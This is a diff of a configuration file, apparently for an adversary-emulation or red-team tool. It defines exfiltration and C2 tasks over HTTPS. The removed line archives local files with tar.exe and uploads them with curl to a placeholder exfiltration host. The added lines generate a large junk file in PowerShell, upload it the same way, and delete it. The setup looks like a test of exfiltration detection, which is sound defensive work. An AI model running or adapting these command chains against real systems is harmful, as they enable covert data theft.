@@ -1,5 +1,4 @@
 [exfil_task]
-exfil_outfile = exfil_file.zip
 exfil_type = http
 exfil_port = 443
 tls = True
@@ -10,4 +9,9 @@ cert_subj = /C=US/ST=Utah/L=Lehi/O=Your Company, Inc./OU=IT/CN=$HOST
 [c2_task]
 task_name = c2_http_mm_dd_YYYY_HH_MM
 agent_name = 1w2x3y4z
-command_list = tar.exe -a -c -f c:\$EXFIL_OUTFILE c:\*MB.bin; dir c:\, c:\Windows\System32\curl.exe -k -F file=@c:\$EXFIL_OUTFILE $EXFIL_TYPE$TLS://$EXFIL_HOST:$EXFIL_PORT/p
+
+[exfil_actions]
+exfil_file = exfil_file.txt
+exfil_path = c:\\
+exfil_size = 1000
+command_list = New-Item $EXFIL_PATH$EXFIL_FILE; while((Get-Item -Path $EXFIL_PATH$EXFIL_FILE).Length/1MB -le $EXFIL_SIZE){"1234567890qwertyasdfjkl;"*1048576 >> $EXFIL_PATH$EXFIL_FILE}, dir $EXFIL_PATH, c:\Windows\System32\curl.exe -k -F file=@$EXFIL_PATH$EXFIL_FILE $EXFIL_TYPE$TLS://$EXFIL_HOST:$EXFIL_PORT/p, del $EXFIL_PATH$EXFIL_FILE
